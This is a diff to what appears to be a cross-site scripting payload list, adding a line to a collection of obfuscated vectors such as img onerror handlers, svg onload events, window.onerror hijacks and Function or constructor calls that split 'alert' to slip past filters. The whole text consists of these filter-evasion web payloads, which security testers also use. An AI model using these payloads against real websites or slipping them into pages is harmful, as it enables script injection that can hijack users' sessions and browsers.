@@ -20,6 +20,7 @@ windiow
 <img src="1" onerror=location="javascript:aler"%2b"t%2"%2b"81%2"%2b"9">
 <img src=1 onerror=a="%2",location="javascript:aler"%2b"t"%2ba%2b"81"%2ba%2b"9">
 
+  
 <svg onload="javascript:window.onerror=alert;throw 1">
 <svg onload="javascript:top.onerror=alert;throw 1">
 <svg onload="javascript:parent.onerror=alert;throw 1">
@@ -37,7 +38,8 @@ IE:
 window.onerror = function()
 Function("ale"+"rt(1)")();
 new Function`al\ert\`6\``;
-
+javascript:[$,_]=(function()[_ for each(_ in ["alert",eval])])
+  
 constructor.constructor("aler"+"t(3)")();
 [].filter.constructor('ale'+'rt(4)')();
 
